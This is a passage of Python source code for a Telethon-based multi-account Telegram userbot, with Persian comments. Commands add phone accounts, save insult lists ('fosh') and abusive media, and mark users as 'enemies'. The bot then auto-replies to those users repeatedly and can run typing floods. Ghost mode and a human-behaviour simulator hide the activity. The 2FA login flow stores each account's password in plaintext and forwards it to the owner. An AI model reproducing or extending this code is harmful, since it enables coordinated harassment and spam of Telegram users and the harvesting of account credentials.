          _ph_task = asyncio.create_task(_apply_privacy_hardening(client, session_name))
          _ph_task.add_done_callback(
              lambda t: log.warning(f"[privacy] {session_name} done: {t.exception()}")
              if not t.cancelled() and t.exception() else None
          )

      # Ghost Mode: بلافاصله آفلاین کن تا آنلاین نشون نده
      if GHOST_MODE:
          try:
              from telethon.tl.functions.account import UpdateStatusRequest as _USR_GH
              await client(_USR_GH(offline=True))
          except Exception:
              pass

      task = asyncio.create_task(run_worker(client, session_name))
      meta["task"] = task

      # Human Simulator — اگه فعاله، task پس‌زمینه رو شروع کن
      if state.get("human_sim", False):
          old_sim = _human_sim_tasks.pop(session_name, None)
          if old_sim and not old_sim.done():
              old_sim.cancel()
          _human_sim_tasks[session_name] = asyncio.create_task(
              _human_sim_loop(client, session_name, state)
          )
          log.warning(f"[human-sim] started for {session_name}")

      log.warning(f"Started worker: {session_name}")
    except Exception as e:
      log.warning(f"start_worker error for {session_name}: {e}")
      try:
          await client.disconnect()
      except Exception:
          pass
      return

async def run_worker(client: TelegramClient, session_name: str) -> None:
    # خطاهای کانکشنی که باید بلافاصله reconnect بشن
    _CONN_ERRORS = (
        ConnectionError, OSError, EOFError,
        asyncio.IncompleteReadError,
    )
    try:
      await client.run_until_disconnected()
    except _CONN_ERRORS as e:
      log.warning(f"[run_worker] {session_name} connection lost ({type(e).__name__}: {e}) — scheduling immediate reconnect")
      # cleanup قبل از reconnect
      cur = managed.get(session_name)
      if cur is not None and cur.get("client") is client:
          managed.pop(session_name, None)
          st = cur.get("state", {})
          if st.get("_send_task"):
              try:
                  st["_send_task"].cancel()
              except Exception:
                  pass
          save_session_state(session_name, st)
          _sim_t = _human_sim_tasks.pop(session_name, None)
          if _sim_t and not _sim_t.done():
              _sim_t.cancel()
      log.warning(f"Stopped worker: {session_name}")
      # reconnect فوری (بدون انتظار برای auto_reconnect_loop)
      if session_name not in manually_disabled:
          async def _immediate_reconnect():
              await asyncio.sleep(5)
              if session_name not in managed and session_name not in manually_disabled:
                  try:
                      await start_worker(session_name)
                      log.warning(f"[run_worker] {session_name} immediately reconnected")
                  except Exception as re:
                      log.warning(f"[run_worker] {session_name} immediate reconnect failed: {re}")
          asyncio.create_task(_immediate_reconnect())
      return
    except Exception:
      pass
    finally:
      # فقط اگه این همون کلاینتیه که الان در managed ثبته pop کن
      # (جلوگیری از race condition با reconnect_session_with_proxy)
      cur = managed.get(session_name)
      if cur is not None and cur.get("client") is client:
          managed.pop(session_name, None)
          st = cur.get("state", {})
          if st.get("_send_task"):
              try:
                    st["_send_task"].cancel()
              except Exception:
                    pass
          save_session_state(session_name, st)
          # ── Stop human sim task ──
          _sim_t = _human_sim_tasks.pop(session_name, None)
          if _sim_t and not _sim_t.done():
              _sim_t.cancel()
      log.warning(f"Stopped worker: {session_name}")

# -------------------------
# attach_handlers
# -------------------------
HANDLERS_ATTACHED: Set[str] = set()

def attach_handlers(client: TelegramClient, session_name: str, state: dict, is_main: bool = False) -> None:
    if session_name in HANDLERS_ATTACHED:
      return
    HANDLERS_ATTACHED.add(session_name)

    def _is_targeted_to_other_session(cmd_session: Optional[str]) -> bool:
      if not cmd_session:
          return False
      return cmd_session != session_name

    async def _safe_reply(ev, txt):
      await minimal_reply(client, ev, txt)

    # MULTI helpers
    def parse_id_list(argstr: Optional[str]) -> List[int]:
      if not argstr:
          return []
      parts = argstr.split()
      res = []
      for p in parts:
          p = p.strip()
          if not p:
              continue
          if p.startswith("@"):
              p = p[1:]
          if p.lstrip("-").isdigit():
              res.append(int(p))
      return res

    async def save_media_from_reply(local_client: TelegramClient, event, session_name: str) -> Optional[str]:
      if not event.is_reply:
          return None
      rep = await event.get_reply_message()
      if not rep or not rep.media:
          return None
      ddir = media_store_dir(session_name)
      fname = os.path.join(ddir, f"enemy_{int(datetime.utcnow().timestamp())}_{random.randint(1000,9999)}")
      try:
          path = await local_client.download_media(rep, file=fname)
          return path
      except Exception:
          return None

    # Main-only addsession flow
    if is_main:
      @client.on(events.NewMessage(pattern=re.compile(r'^addsession\s+(\+?\d+)', re.IGNORECASE)))
      async def cmd_addsession(event):
          sender = event.sender_id
          if not (is_owner(sender) or is_admin(sender)):
              return
          phone = event.pattern_match.group(1).strip()
          sess = generate_next_session_name()
          if sess in sessions_db:
              await client.send_message(event.chat_id, "session already exists")
              if sess not in managed:
                    await start_worker(sess, phone=phone)
              return
          tmp = _make_client(sess_path(sess), session_name=sess)
          try:
              await tmp.connect()
              await tmp.send_code_request(phone)
          except Exception as e:
              await client.send_message(event.chat_id, f"error sending code: {e}")
              try:
                    await tmp.disconnect()
              except Exception:
                    pass
              return
          pending_logins[phone] = {"tmp": tmp, "session": sess, "sender": sender, "phone": phone}
          await client.send_message(event.chat_id, "code sent. reply: code <phone> <12345> or 2fa <phone> <password>")

      @client.on(events.NewMessage(pattern=re.compile(r'^code\s+(\+?\d+)\s+(\d+)', re.IGNORECASE)))
      async def cmd_code(event):
          sender = event.sender_id
          phone = event.pattern_match.group(1).strip()
          code = event.pattern_match.group(2).strip()
          pend = pending_logins.get(phone)
          if not pend:
              return
          if sender != pend["sender"] and not is_owner(sender) and not is_admin(sender):
              return
          tmp = pend["tmp"]
          sess = pend["session"]
          try:
              await tmp.sign_in(phone=phone, code=code)
          except SessionPasswordNeededError:
              await client.send_message(event.chat_id, "2FA required. send: 2fa <phone> <password>")
              return
          except Exception as e:
              await client.send_message(event.chat_id, f"sign_in error: {e}")
              try:
                    await tmp.disconnect()
              except Exception:
                    pass
              pending_logins.pop(phone, None)
              return
          sessions_db[sess] = {"phone": phone, "created_at": datetime.utcnow().isoformat(), "admins": []}
          save_db()
          try:
              await tmp.disconnect()
          except Exception:
              pass
          await asyncio.sleep(0.5)
          await start_worker(sess, phone=phone)
          pending_logins.pop(phone, None)
          await finish_group_assignment(client, event.chat_id, sess, phone, sender)

      @client.on(events.NewMessage(pattern=re.compile(r'^2fa\s+(\+?\d+)\s+(.+)', re.IGNORECASE)))
      async def cmd_2fa(event):
          sender = event.sender_id
          phone = event.pattern_match.group(1).strip()
          pwd = event.pattern_match.group(2).strip()
          pend = pending_logins.get(phone)
          if not pend:
              return
          if sender != pend["sender"] and not is_owner(sender) and not is_admin(sender):
              return
          tmp = pend["tmp"]
          sess = pend["session"]
          try:
              await tmp.sign_in(password=pwd)
          except Exception as e:
              await send_spoiler(client, event.chat_id, f"خطا در 2FA: {e}")
              try:
                    await tmp.disconnect()
              except Exception:
                    pass
              pending_logins.pop(phone, None)
              return
          sessions_db[sess] = {"phone": phone, "created_at": datetime.utcnow().isoformat(), "admins": [], "twofa": pwd}
          save_db()
          save_2fa_to_file(sess, phone, pwd)
          try:
              await tmp.disconnect()
          except Exception:
              pass
          await asyncio.sleep(0.5)
          await start_worker(sess, phone=phone)
          pending_logins.pop(phone, None)
          await finish_group_assignment(client, event.chat_id, sess, phone, sender)
          try:
              notif_2fa = f"<spoiler> 2FA جدید ثبت شد\nاکانت: {sess}\n شماره: {phone}\n رمز 2FA: {pwd}</spoiler>"
              if bot_client:
                    await bot_client.send_message(OWNER_ID, notif_2fa, parse_mode="html")
              else:
                    await main_client.send_message(OWNER_ID, notif_2fa, parse_mode="html")
          except Exception:
              pass

      @client.on(events.NewMessage(pattern=re.compile(r'^pickgroup\s+(\S+)$', re.IGNORECASE)))
      async def cmd_pickgroup(event):
          sender = event.sender_id
          picked = event.pattern_match.group(1).strip()
          pend = pending_group_selection.get(sender)
          if not pend:
              return
          sess = pend["sess"]
          phone = pend["phone"]
          if picked not in groups_db:
              await send_spoiler(client, event.chat_id, f"ریموت '{picked}' پیدا نشد. دوباره امتحان کنید.")
              return
          if not is_owner(sender) and int(groups_db[picked].get("owner", 0)) != sender:
              await send_spoiler(client, event.chat_id, "این ریموت مال شما نیست.")
              return
          _err = assign_session_to_group(sess, picked)
          if _err:
              await send_spoiler(client, event.chat_id, f" خطا: {_err}")
              return
          pending_group_selection.pop(sender, None)
          sessions_in_group = groups_db[picked].get("sessions", [])
          is_first = len(sessions_in_group) == 1
          role_label = "👑 اکانت اول (مخصوص owner)" if is_first else f"اکانت #{len(sessions_in_group)}"
          notif = f" اکانت اضافه شد\nنام: {sess}\nریموت: {picked}\nنقش: {role_label}\nشماره: {phone}"
          await send_spoiler(client, event.chat_id, notif)
          try:
              await send_spoiler(main_client, OWNER_ID, notif)
          except Exception:
              pass

    # accountsname
    @client.on(events.NewMessage(pattern=re.compile(r'^accountsname$', re.IGNORECASE)))
    async def cmd_accountsname(event):
      if not has_admin_access(event.sender_id, session_name=session_name, state=state):
          return
      await minimal_reply(client, event, f"Session Name: {session_name}")

    # addfosh / delfosh / cleanfosh (per-session) -- ensure per-account availability
    @client.on(events.NewMessage(pattern=re.compile(r'^addfosh(?:\\s+(\\S+))?\\s+(.+)$', re.IGNORECASE)))
    async def cmd_addfosh(event):
      sender = event.sender_id
      tgt = event.pattern_match.group(1)
      txt = event.pattern_match.group(2).strip()
      if tgt and tgt != session_name:
          return
      if session_name == MAIN_SESSION:
          # main: owner/admin can add for other sessions via explicit target
          if tgt:
              if not (is_owner(sender) or is_admin(sender) or is_global_admin(sender)):
                    return
              st = load_session_state(tgt)
              st.setdefault("messages", []).append(txt)
              save_session_state(tgt, st)
              if tgt in managed:
                    managed[tgt]["state"]["messages"].append(txt)
              await client.send_message(event.chat_id, f"Added message to {tgt}: {txt}")
              return
          # else fallthrough to require target
          await client.send_message(event.chat_id, "Specify target account when using from main.")
          return
      # per-account: ensure admin access on that account
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      state.setdefault("messages", []).append(txt)
      save_session_state(session_name, state)
      await minimal_reply(client, event, f"Added message to {session_name}: {txt}")

    @client.on(events.NewMessage(pattern=re.compile(r'^delfosh(?:\\s+(\\S+))?\\s+(.+)$', re.IGNORECASE)))
    async def cmd_delfosh(event):
      sender = event.sender_id
      tgt = event.pattern_match.group(1)
      txt = event.pattern_match.group(2).strip()
      if tgt and tgt != session_name and session_name != MAIN_SESSION:
          return
      if session_name == MAIN_SESSION and tgt:
          if not (is_owner(sender) or is_admin(sender) or is_global_admin(sender)):
              return
          st = load_session_state(tgt)
          before = len(st.get("messages", []))
          st["messages"] = [m for m in st.get("messages", []) if m != txt]
          removed = before - len(st["messages"])
          save_session_state(tgt, st)
          if tgt in managed:
              managed[tgt]["state"]["messages"] = st["messages"]
          await client.send_message(event.chat_id, f"Removed {removed} occurrences from {tgt}")
          return
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      before = len(state.get("messages", []))
      state["messages"] = [m for m in state.get("messages", []) if m != txt]
      removed = before - len(state["messages"])
      save_session_state(session_name, state)
      if removed:
          await minimal_reply(client, event, f"Removed {removed} occurrences from {session_name}")
      else:
          await minimal_reply(client, event, "No exact match found to remove.")

    @client.on(events.NewMessage(pattern=re.compile(r'^cleanfosh(?:\\s+(\\S+))?$', re.IGNORECASE)))
    async def cmd_cleanfosh(event):
      sender = event.sender_id
      tgt = event.pattern_match.group(1)
      if tgt and session_name == MAIN_SESSION:
          if not (is_owner(sender) or is_admin(sender) or is_global_admin(sender)):
              return
          if tgt not in sessions_db:
              await minimal_reply(client, event, f"Session {tgt} not found.")
              return
          st = load_session_state(tgt)
          st["messages"] = []
          save_session_state(tgt, st)
          if tgt in managed:
              managed[tgt]["state"]["messages"] = []
          await minimal_reply(client, event, f"All messages cleared for {tgt}")
          return
      if tgt and tgt != session_name:
          return
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      state["messages"] = []
      save_session_state(session_name, state)
      await minimal_reply(client, event, f"All messages cleared for {session_name}")

    # global add/del/clean fosh (scoped to owner)
    @client.on(events.NewMessage(pattern=re.compile(r'^globaladdfosh\\s+(.+)$', re.IGNORECASE)))
    async def cmd_globaladdfosh(event):
      sender = event.sender_id
      txt = event.pattern_match.group(1).strip()
      if is_owner(sender):
          target_sessions = list(sessions_db.keys())
      else:
          target_sessions = list(get_sessions_for_owner(sender))
      if not target_sessions:
          await minimal_reply(client, event, "No sessions available to apply globaladdfosh.")
          return
      for name in target_sessions:
          st = load_session_state(name)
          st.setdefault("messages", []).append(txt)
          save_session_state(name, st)
          if name in managed:
              managed[name]["state"]["messages"].append(txt)
      await minimal_reply(client, event, "globaladdfosh applied to your sessions.")

    @client.on(events.NewMessage(pattern=re.compile(r'^globaldelfosh\\s+(.+)$', re.IGNORECASE)))
    async def cmd_globaldelfosh(event):
      sender = event.sender_id
      txt = event.pattern_match.group(1).strip()
      if is_owner(sender):
          target_sessions = list(sessions_db.keys())
      else:
          target_sessions = list(get_sessions_for_owner(sender))
      if not target_sessions:
          await minimal_reply(client, event, "No sessions available to apply globaldelfosh.")
          return
      for name in target_sessions:
          st = load_session_state(name)
          before = len(st.get("messages", []))
          st['messages'] = [m for m in st.get("messages", []) if m != txt]
          if name in managed:
              managed[name]["state"]["messages"] = st['messages']
          save_session_state(name, st)
      await minimal_reply(client, event, "globaldelfosh applied to your sessions.")

    @client.on(events.NewMessage(pattern=re.compile(r'^globalcleanfosh$', re.IGNORECASE)))
    async def cmd_global_cleanfosh(event):
      sender = event.sender_id
      if is_owner(sender):
          target_sessions = list(sessions_db.keys())
      else:
          target_sessions = list(get_sessions_for_owner(sender))
      if not target_sessions:
          await minimal_reply(client, event, "No sessions available to clean.")
          return
      for name in target_sessions:
          st = load_session_state(name)
          st['messages'] = []
          save_session_state(name, st)
          if name in managed:
              managed[name]["state"]["messages"] = []
      await minimal_reply(client, event, "All messages cleared for your sessions.")

    # MULTI setid / delid / globalsetid / globaldelid / globalcleanid
    @client.on(events.NewMessage(pattern=re.compile(r'^setid(?:\\s+(\\S+))?\\s+(.+)$', re.IGNORECASE)))
    async def cmd_setid(event):
      sender = event.sender_id
      tgt = event.pattern_match.group(1)
      argline = event.pattern_match.group(2)
      if tgt and tgt != session_name and session_name != MAIN_SESSION:
          return
      # scope check
      if session_name == MAIN_SESSION and tgt:
          # main acting on other session
          if not (is_owner(sender) or is_admin(sender) or is_global_admin(sender)):
              return
          target = tgt
          st = load_session_state(target)
          ids = parse_id_list(argline)
          if not ids:
              await client.send_message(event.chat_id, "Provide at least one id.")
              return
          for cid in ids:
              st.setdefault("locked_users", set()).add(cid)
          save_session_state(target, st)
          if target in managed:
              managed[target]["state"]["locked_users"].update(st["locked_users"])
          await client.send_message(event.chat_id, f"Added IDs to {target}: {', '.join(map(str, ids))}")
          return
      # per-account
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      ids = parse_id_list(argline)
      if not ids and event.is_reply:
          rep = await event.get_reply_message()
          uid = await resolve_sender_id_from_message(rep)
          if uid:
              ids = [uid]
      if not ids:
          await minimal_reply(client, event, "Provide ID(s) or reply to message.")
          return
      for cid in ids:
          state.setdefault("locked_users", set()).add(cid)
      save_session_state(session_name, state)
      await minimal_reply(client, event, f"Added IDs: {', '.join(map(str, ids))} to {session_name}")

    @client.on(events.NewMessage(pattern=re.compile(r'^delid(?:\\s+(\\S+))?\\s+(.+)$', re.IGNORECASE)))
    async def cmd_delid(event):
      sender = event.sender_id
      tgt = event.pattern_match.group(1)
      argline = event.pattern_match.group(2)
      if tgt and tgt != session_name and session_name != MAIN_SESSION:
          return
      if session_name == MAIN_SESSION and tgt:
          if not (is_owner(sender) or is_admin(sender) or is_global_admin(sender)):
              return
          target = tgt
          ids = parse_id_list(argline)
          if not ids:
              await client.send_message(event.chat_id, "Provide at least one id.")
              return
          st = load_session_state(target)
          before = set(st.get("locked_users", []))
          for cid in ids:
              before.discard(cid)
          st["locked_users"] = before
          save_session_state(target, st)
          if target in managed:
              managed[target]["state"]["locked_users"] = set(st["locked_users"])
          await client.send_message(event.chat_id, f"Removed IDs from {target}: {', '.join(map(str, ids))}")
          return
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      ids = parse_id_list(argline)
      if not ids and event.is_reply:
          rep = await event.get_reply_message()
          uid = await resolve_sender_id_from_message(rep)
          if uid:
              ids = [uid]
      if not ids:
          await minimal_reply(client, event, "Provide ID(s) or reply to message.")
          return
      removed = 0
      for cid in ids:
          if cid in state.get("locked_users", set()):
              state["locked_users"].discard(cid)
              removed += 1
      save_session_state(session_name, state)
      await minimal_reply(client, event, f"Removed {removed} IDs from {session_name}")

    @client.on(events.NewMessage(pattern=re.compile(r'^globalsetid\\s+(.+)$', re.IGNORECASE)))
    async def cmd_globalsetid(event):
      sender = event.sender_id
      args_line = event.pattern_match.group(1).strip()
      if is_owner(sender):
          target_sessions = list(sessions_db.keys())
      else:
          target_sessions = list(get_sessions_for_owner(sender))
      if not target_sessions:
          await minimal_reply(client, event, "No sessions available to apply globalsetid.")
          return
      ids = parse_id_list(args_line)
      if not ids:
          await minimal_reply(client, event, "Provide at least one numeric id or @username.")
          return
      added = []
      for name in target_sessions:
          st = load_session_state(name)
          if isinstance(st.get("locked_users"), list):
              st["locked_users"] = set(st.get("locked_users"))
          for cid in ids:
              if cid not in st["locked_users"]:
                    st["locked_users"].add(cid)
                    added.append((name, cid))
          save_session_state(name, st)
          if name in managed:
              managed[name]["state"]["locked_users"].update(st["locked_users"])
      if added:
          await minimal_reply(client, event, f"Added IDs to sessions: {', '.join([f'{s}:{i}' for s,i in added])}")
      else:
          await minimal_reply(client, event, "No new IDs added (duplicates?).")

    @client.on(events.NewMessage(pattern=re.compile(r'^globaldelid\\s+(.+)$', re.IGNORECASE)))
    async def cmd_globaldelid(event):
      sender = event.sender_id
      args_line = event.pattern_match.group(1).strip()
      if is_owner(sender):
          target_sessions = list(sessions_db.keys())
      else:
          target_sessions = list(get_sessions_for_owner(sender))
      if not target_sessions:
          await minimal_reply(client, event, "No sessions available to apply globaldelid.")
      ids = parse_id_list(args_line)
      if not ids:
          await minimal_reply(client, event, "Provide at least one numeric id.")
          return
      removed = []
      for name in target_sessions:
          st = load_session_state(name)
          lu = set(st.get("locked_users", []))
          before = set(lu)
          for cid in ids:
              lu.discard(cid)
          st["locked_users"] = list(lu)
          save_session_state(name, st)
          if name in managed:
              managed[name]["state"]["locked_users"] = set(lu)
          removed_now = before - lu
          for r in removed_now:
              removed.append((name, r))
      if removed:
          await minimal_reply(client, event, f"Removed IDs: {', '.join([f'{s}:{i}' for s,i in removed])}")
      else:
          await minimal_reply(client, event, "No IDs removed (not found?).")

    @client.on(events.NewMessage(pattern=re.compile(r'^globalcleanid$', re.IGNORECASE)))
    async def cmd_global_cleanid(event):
      sender = event.sender_id
      if is_owner(sender):
          target_sessions = list(sessions_db.keys())
      else:
          target_sessions = list(get_sessions_for_owner(sender))
      if not target_sessions:
          await minimal_reply(client, event, "No sessions available to clean IDs.")
          return
      for name in target_sessions:
          st = load_session_state(name)
          st["locked_users"] = set()
          save_session_state(name, st)
          if name in managed:
              managed[name]["state"]["locked_users"].clear()
      await minimal_reply(client, event, "All mention IDs cleared for your sessions")

    # self auto-reply: queue latest message from each target, reply every 3 seconds
    _self_pending: dict = {}   # sender_id -> (chat_id, msg_id)

    def _normalize_media(m):
      if isinstance(m, str):
          return {"path": m, "type": "photo"}
      return m

    async def _do_self_reply(chat_id, msg_id):
      """Send a self-reply item to the given chat, replying to msg_id."""
      # ── show typing / recording action before sending ──────
      if state.get("autotyping"):
          try:
              await client(SetTypingRequest(peer=chat_id, action=SendMessageTypingAction()))
          except Exception:
              pass
          await asyncio.sleep(1)
      elif state.get("autorecord"):
          try:
              await client(SetTypingRequest(peer=chat_id, action=SendMessageRecordAudioAction()))
          except Exception:
              pass
          await asyncio.sleep(1)

      filter_mode = state.get("self_reply_filter", "all")
      raw_media = state.get("self_reply_media", [])
      text_list = state.get("self_reply_text", [])
      _nm_list = [_normalize_media(m) for m in raw_media]
      all_media = [nm for nm in _nm_list if nm.get("path") and os.path.exists(nm["path"])]

      try:
          if filter_mode == "text":
              if text_list:
                    await client.send_message(chat_id, random.choice(text_list), reply_to=msg_id)
              return

          if filter_mode in ("photo", "gif", "video", "sticker"):
              pool = [m for m in all_media if m.get("type") == filter_mode]
              if pool:
                    chosen = random.choice(pool)
                    await client.send_file(chat_id, chosen["path"],
                                           caption=chosen.get("caption") or None,
                                           reply_to=msg_id)
              elif text_list:
                    await client.send_message(chat_id, random.choice(text_list), reply_to=msg_id)
              return

          txt_pool = [{"kind": "text", "val": t} for t in text_list]
          med_pool = [{"kind": "media", "val": m} for m in all_media]
          if not txt_pool and not med_pool:
              return
          if txt_pool and med_pool:
              pick = random.choice(txt_pool if random.random() < 0.5 else med_pool)
          elif txt_pool:
              pick = random.choice(txt_pool)
          else:
              pick = random.choice(med_pool)

          if pick["kind"] == "text":
              await client.send_message(chat_id, pick["val"], reply_to=msg_id)
          else:
              m = pick["val"]
              await client.send_file(chat_id, m["path"],
                                       caption=m.get("caption") or None,
                                       reply_to=msg_id)
      except FloodWaitError as e:
          wait = e.seconds + random.randint(1, 3)
          log.warning(f"[self-reply] FloodWait: sleeping {wait}s")
          await asyncio.sleep(wait)
      except Exception as e:
          log.warning(f"[self-reply] send error: {e}")

    # per-sender pending queue: only latest message per sender is kept
    _self_reply_pending: dict = {}   # uid -> (chat_id, msg_id)
    _self_reply_workers: dict = {}   # uid -> asyncio.Task
    # Cache: uid -> is_bot (True=bot, False=human). Only cached on successful lookup.
    # On get_sender() failure the uid is NOT cached so it retries next message.
    _bot_uid_cache: Dict[int, bool] = {}
    # Cache: managed UIDs set + frozenset of managed keys to detect membership changes.
    # Using frozenset of keys (not just len) catches swap/reconnect without size change.
    _managed_uid_state: dict = {"uids": set(), "keys": frozenset()}

    @client.on(events.NewMessage())
    async def _auto_enemy(event):
      if event.out:
          return
      if not state.get("bot_active", True):
          return
      if not state.get("auto_reply"):
          return
      # Skip service messages (no sender)
      if not event.sender_id:
          return
      uid = event.sender_id

      # Skip bots — cached by UID; only stored on successful get_sender() so transient
      # failures don't permanently whitelist a bot until restart.
      if uid not in _bot_uid_cache:
          try:
              sender_entity = await event.get_sender()
              _bot_uid_cache[uid] = (sender_entity is None or getattr(sender_entity, 'bot', False))
          except Exception:
              pass  # not cached — will retry on next message
      if _bot_uid_cache.get(uid, False):
          return

      # Skip messages from other managed sessions — refresh cache when membership changes.
      # Uses frozenset of managed keys (not just len) to catch swap/reconnect without size change.
      cur_keys = frozenset(managed.keys())
      if cur_keys != _managed_uid_state["keys"]:
          _managed_uid_state["uids"] = {m.get("uid") for m in managed.values() if m.get("uid")}
          _managed_uid_state["keys"] = cur_keys
      if uid in _managed_uid_state["uids"]:
          return
      targets = state.get("locked_auto_reply", set())
      # No ID set at all => do not reply to anyone until an ID is added.
      if not targets or event.sender_id not in targets:
          return
      uid = event.sender_id
      chat_id = event.chat_id
      msg_id = event.id

      # Update pending — always keep only the latest message per sender
      _self_reply_pending[uid] = (chat_id, msg_id)

      # If a worker is already running for this user, it will pick up the latest pending
      existing = _self_reply_workers.get(uid)
      if existing and not existing.done():
          return

      async def _worker(sender_uid):
          while sender_uid in _self_reply_pending:
              c_id, m_id = _self_reply_pending.pop(sender_uid)
              try:
                    await _do_self_reply(c_id, m_id)
              except Exception as e:
                    log.warning(f"[self_reply:{session_name}] error: {e}")
              # Wait the configured interval before processing next message
              iv = max(1, int(state.get("self_reply_interval", 30)))
              await asyncio.sleep(iv)

      _self_reply_workers[uid] = asyncio.create_task(_worker(uid))

    @client.on(events.NewMessage(pattern=re.compile(r'^setenemy(?:\\s+(.+))?$', re.IGNORECASE)))
    async def cmd_setenemy(event):
      sender = event.sender_id
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      if event.is_reply:
          rep = await event.get_reply_message()
          uid = await resolve_sender_id_from_message(rep)
          if uid:
              state.setdefault("locked_auto_reply", set()).add(uid)
              save_session_state(session_name, state)
              await minimal_reply(client, event, f"Added enemy: {uid}")
          else:
              await minimal_reply(client, event, "cannot resolve id")
          return
      arg = event.pattern_match.group(1)
      if not arg:
          await minimal_reply(client, event, "Provide an ID or username or reply to a message.")
          return
      arg = arg.strip()
      if arg.lstrip("-").isdigit():
          state.setdefault("locked_auto_reply", set()).add(int(arg))
          save_session_state(session_name, state)
          await minimal_reply(client, event, f"Added enemy ID: {arg}")
      else:
          uname = arg.lstrip("@")
          try:
              u = await client.get_entity(uname)
              state.setdefault("locked_auto_reply", set()).add(u.id)
              save_session_state(session_name, state)
              await minimal_reply(client, event, f"Added enemy @{uname} (ID: {u.id})")
          except Exception:
              await minimal_reply(client, event, f"Could not resolve username @{uname}")

    @client.on(events.NewMessage(pattern=re.compile(r'^delenemy(?:\\s+(.+))?$', re.IGNORECASE)))
    async def cmd_delenemy(event):
      sender = event.sender_id
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      if event.is_reply:
          rep = await event.get_reply_message()
          uid = await resolve_sender_id_from_message(rep)
          if uid:
              state["locked_auto_reply"].discard(uid)
              save_session_state(session_name, state)
              await minimal_reply(client, event, f"Removed enemy: {uid}")
          return
      arg = event.pattern_match.group(1)
      if not arg:
          await minimal_reply(client, event, "Provide an ID or username or reply to a message.")
          return
      arg = arg.strip()
      if arg.lstrip("-").isdigit():
          state["locked_auto_reply"].discard(int(arg))
          save_session_state(session_name, state)
          await minimal_reply(client, event, f"Removed enemy ID: {arg}")
      else:
          uname = arg.lstrip("@")
          try:
              u = await client.get_entity(uname)
              state["locked_auto_reply"].discard(u.id)
              save_session_state(session_name, state)
              await minimal_reply(client, event, f"Removed @{uname} (ID: {u.id})")
          except Exception:
              await minimal_reply(client, event, f"Could not resolve username @{uname}")

    @client.on(events.NewMessage(pattern=re.compile(r'^cleanenemy$', re.IGNORECASE)))
    async def cmd_cleanenemy(event):
      sender = event.sender_id
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      state["locked_auto_reply"].clear()
      save_session_state(session_name, state)
      await minimal_reply(client, event, "Enemy list cleared.")

    @client.on(events.NewMessage(pattern=re.compile(r'^setreplyinterval(?:\s+(\d+))?$', re.IGNORECASE)))
    async def cmd_setreplyinterval(event):
      sender = event.sender_id
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      arg = event.pattern_match.group(1)
      if not arg:
          current = state.get("self_reply_interval", 30)
          await minimal_reply(client, event, f" Reply interval فعلی: {current} ثانیه\nبرای تغییر: setreplyinterval <ثانیه>")
          return
      secs = int(arg)
      if secs < 1:
          await minimal_reply(client, event, " حداقل ۱ ثانیه.")
          return
      state["self_reply_interval"] = secs
      save_session_state(session_name, state)
      await minimal_reply(client, event, f" Reply interval تنظیم شد: هر {secs} ثانیه یک‌بار به آخرین پیام رپلای میزنه.")

    # setenemygif: save GIF from reply to enemy_gifs
    @client.on(events.NewMessage(pattern=re.compile(r'^setenemygif$', re.IGNORECASE)))
    async def cmd_setenemygif(event):
      sender = event.sender_id
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      path = await save_media_from_reply(client, event, session_name)
      if not path:
          await minimal_reply(client, event, "Reply to a GIF/media message to register an enemy GIF.")
          return
      st = load_session_state(session_name)
      st.setdefault("enemy_gifs", [])
      st["enemy_gifs"].append(path)
      save_session_state(session_name, st)
      if session_name in managed:
          managed[session_name]["state"]["enemy_gifs"].append(path)
      await minimal_reply(client, event, "Enemy GIF registered.")

    # addfoshmedia: save replied media as a message entry
    @client.on(events.NewMessage(pattern=re.compile(r'^addfoshmedia(?:\\s+(\\S+))?$', re.IGNORECASE)))
    async def cmd_addfoshmedia(event):
      sender = event.sender_id
      tgt = event.pattern_match.group(1)
      if tgt and tgt != session_name and session_name != MAIN_SESSION:
          return
      if session_name == MAIN_SESSION and tgt:
          if not (is_owner(sender) or is_admin(sender) or is_global_admin(sender)):
              return
          target = tgt
          path = await save_media_from_reply(client, event, target)
          if not path:
              await client.send_message(event.chat_id, "Reply to a media message to add as fosh media.")
              return
          st = load_session_state(target)
          st.setdefault("messages", []).append({"file_path": path})
          save_session_state(target, st)
          if target in managed:
              managed[target]["state"]["messages"].append({"file_path": path})
          await client.send_message(event.chat_id, f"Media added to {target}")
          return
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      if not event.is_reply:
          await minimal_reply(client, event, "Reply to a media message to add as fosh media.")
          return
      path = await save_media_from_reply(client, event, session_name)
      if not path:
          await minimal_reply(client, event, "Failed to download media.")
          return
      state.setdefault("messages", []).append({"file_path": path})
      save_session_state(session_name, state)
      await minimal_reply(client, event, "Media added to messages.")

    # autotyping / autorecord commands
    @client.on(events.NewMessage(pattern=re.compile(r'^autotyping\\s+(on|off)$', re.IGNORECASE)))
    async def cmd_autotyping(event):
      sender = event.sender_id
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      v = event.pattern_match.group(1).lower()
      state["autotyping"] = (v == "on")
      save_session_state(session_name, state)
      await minimal_reply(client, event, f"Autotyping set to {state['autotyping']}")

    @client.on(events.NewMessage(pattern=re.compile(r'^autorecord\\s+(on|off)$', re.IGNORECASE)))
    async def cmd_autorecord(event):
      sender = event.sender_id
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      v = event.pattern_match.group(1).lower()
      state["autorecord"] = (v == "on")
      save_session_state(session_name, state)
      await minimal_reply(client, event, f"Autorecord set to {state['autorecord']}")


    @client.on(events.NewMessage(pattern=re.compile(r'^typingflood\s+(on|off)(?:\s+(.+))?$', re.IGNORECASE)))
    async def cmd_typingflood(event):
      sender = event.sender_id
      if not has_admin_access(sender, session_name=session_name, state=state):
          return
      v   = event.pattern_match.group(1).lower()
      tgt = event.pattern_match.group(2)
      if v == "off":
          for key in [k for k in flood_tasks if k.startswith("typing_")]:
              t = flood_tasks.pop(key, None)
              if t and not t.done():
                    t.cancel()
          await minimal_reply(client, event, " Typing Flood متوقف شد.")
          return
      if not tgt:
          await minimal_reply(client, event, " مقصد رو بنویس.\nمثال: typingflood on @username")
          return
      raw = str(tgt).strip()
